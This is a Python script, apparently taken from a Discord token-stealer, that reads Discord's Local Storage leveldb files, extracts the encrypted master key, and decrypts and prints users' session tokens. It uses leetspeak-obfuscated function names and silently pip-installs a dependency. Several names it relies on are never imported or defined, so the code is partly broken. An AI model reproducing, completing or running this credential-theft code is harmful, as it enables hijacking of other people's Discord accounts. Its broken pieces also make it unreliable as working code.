import re
import os
from Crypto.Cipher import AES
from json import loads
from base64 import b64decode
from ctypes import wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

path = "./discord"
arg = "/Local Storage/leveldb"

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]
        try: decrypted_pass = decrypted_pass.decode()
        except:pass
        return decrypted_pass

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    # master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}/{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global T0K3Ns
                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        print(tokenDecoded)

G37D15C0rD(path, arg)
